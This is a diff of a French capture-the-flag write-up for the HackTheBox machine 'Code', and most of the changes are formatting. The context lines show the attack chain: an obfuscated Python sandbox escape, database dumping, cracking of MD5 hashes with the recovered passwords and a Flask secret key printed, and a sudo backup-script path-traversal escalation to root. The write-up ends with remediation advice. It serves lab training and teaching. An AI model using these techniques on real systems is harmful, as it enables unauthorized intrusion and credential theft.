@@ -1,36 +1,27 @@
 ---
 title: Code
 date: 2025-07-20
-tags: [Remote code execution, privilege-escalation, sudo-exploit, path-traversal]
+tags:
+  [Remote code execution, privilege-escalation, sudo-exploit, path-traversal]
 draft: false
 summary: Cette machine HTB Code présente une application web de type code playground permettant l'exécution de code Python en ligne. L'objectif est de contourner les restrictions de sécurité pour obtenir une exécution de code arbitraire et capturer le flag utilisateur.
 images:
   - /static/images/code/logo.png
 ---
 
-<div
-  style={{ display: "flex", justifyContent: "center", marginBottom: "2rem" }}
->
-  <img
-    src="/static/images/code/logo.png"
-    alt="code_logo"
-    style={{ width: "200px", height: "200px" }}
-  />
-</div>
-
 # Reconnaissance initiale
 
 ## Scan des ports avec Nmap
 
 ```
-└─$ nmap -sC -sV 10.10.11.62        
+└─$ nmap -sC -sV 10.10.11.62
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 09:35 CEST
 Nmap scan report for 10.10.11.62
 Host is up (0.34s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
 |   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
 |_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
@@ -248,6 +239,7 @@ La stratégie finale utilise :
 getattr() permet d'accéder aux attributs (méthodes ou propriétés) d'un objet de manière dynamique en utilisant une chaîne de caractères.
 
 Exemple :
+
 ```
 import os
 
@@ -419,6 +411,7 @@ print(content)
 ```
 
 **Découvertes critiques dans le code source :**
+
 - `SECRET_KEY = "7j4D5htxLHUiffsjLXB1z9GaZ5"` - Clé secrète Flask exposée
 - Base de données SQLite : `sqlite:///database.db`
 - Hachage MD5 pour les mots de passe (vulnérable)
@@ -447,10 +440,10 @@ for db_path in db_locations:
         # Tentative d'ouverture en lecture seule
         fd = f2(db_path, my.O_RDONLY)
         obj = f1(fd, 'r')
-        
+
         # Fermeture immédiate si le fichier existe
         getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
-        
+
         print(f"Database found at: {db_path}")
         break
     except Exception as e:
@@ -478,13 +471,13 @@ cmd_func('mkdir -p /tmp/extraction')
 sql_commands = [
     # Lister toutes les tables de la base
     'sqlite3 /home/app-production/app/instance/database.db ".tables" > /tmp/extraction/tables.txt',
-    
+
     # Extraire le schéma complet de la base
     'sqlite3 /home/app-production/app/instance/database.db ".schema" > /tmp/extraction/schema.txt',
-    
+
     # Extraire tous les utilisateurs (usernames et hashes)
     'sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM user;" > /tmp/extraction/users.txt',
-    
+
     # Extraire les codes sauvegardés (peut contenir des secrets)
     'sqlite3 /home/app-production/app/instance/database.db "SELECT * FROM code;" > /tmp/extraction/codes.txt'
 ]
@@ -517,13 +510,13 @@ for file_path in extraction_files:
         # Ouverture en mode lecture seule
         fd = f2(file_path, my.O_RDONLY)
         obj = f1(fd, 'r')
-        
+
         # Lecture du contenu complet
         content = getattr(obj, chr(114) + chr(101) + chr(97) + chr(100))()  # "read"
-        
+
         # Fermeture du fichier
         getattr(obj, chr(99) + chr(108) + chr(111) + chr(115) + chr(101))()  # "close"
-        
+
         # Affichage organisé des résultats
         print(f"=== {file_path} ===")
         print(content)
@@ -541,6 +534,7 @@ for file_path in extraction_files:
 ```
 
 **Analyse du schéma :**
+
 - Table `user` : id, username, password (MD5)
 - Table `code` : id, user_id, code, name
 - Deux utilisateurs identifiés : `development` et `martin`
@@ -565,12 +559,14 @@ hashcat -a 0 -m 0 martin.hash /usr/share/wordlists/rockyou.txt
 ```
 
 **Résultats du crackage :**
+
 - `development` : `development` (hash : `759b74ce43947f5f4c91aeddc3e5bad3`)
 - `martin` : `nafeelswordsmaster` (hash : `3de6f30c4a09c27fc71932bfc68474be`)
 
 ### Analyse des résultats
 
 Le succès du crackage révèle :
+
 1. **Faiblesse cryptographique** : Utilisation de MD5 sans salt
 2. **Mots de passe prévisibles** : Un utilisateur utilise son nom comme mot de passe
 3. **Vecteur d'escalade** : Accès potentiel à l'utilisateur `martin` via SSH
@@ -588,6 +584,7 @@ ssh martin@10.10.11.62
 ```
 
 **Avantages de l'accès SSH :**
+
 - Environnement shell complet sans restrictions
 - Possibilité d'upload d'outils d'énumération
 - Accès aux commandes système standard
@@ -600,6 +597,7 @@ sudo -l
 ```
 
 **Découverte critique :**
+
 ```
 User martin may run the following commands on localhost:
     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
@@ -616,6 +614,7 @@ cat /usr/bin/backy.sh
 ```
 
 **Code source complet :**
+
 ```bash
 #!/bin/bash
 if [[ $# -ne 1 ]]; then
@@ -710,7 +709,8 @@ EOF
 sudo /usr/bin/backy.sh /tmp/test_format.json
 ```
 
-**Résultat :** 
+**Résultat :**
+
 ```
 📤 Archiving: [/var/../../root]
 📥 To: /tmp/backup ...
@@ -740,7 +740,8 @@ EOF
 sudo /usr/bin/backy.sh /tmp/symlink_var.json
 ```
 
-**Résultat :** 
+**Résultat :**
+
 ```
 📤 Archiving: [/var/tmp/evil/root_access]
 💢 Archiving failed for: /var/tmp/evil/root_access
@@ -818,7 +819,7 @@ cat root.txt
 
 **Pourquoi l'exploitation a fonctionné :**
 
-1. **Filtrage jq insuffisant** : 
+1. **Filtrage jq insuffisant** :
    - `jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))'` supprime `../` mais ne résout pas les chemins
    - Le path `/var/../../root` devient `/var/root` après filtrage
    - Mais le binaire `backy` traite le chemin original avant filtrage
@@ -845,11 +846,13 @@ cat root.txt
 ### Pour le script backy.sh
 
 1. **Résolution de chemins avant validation** :
+
    ```bash
    resolved_path=$(realpath "$dir" 2>/dev/null)
    ```
 
 2. **Validation stricte des chemins résolus** :
+
    ```bash
    case "$resolved_path" in
      /var/*|/home/*) ;;
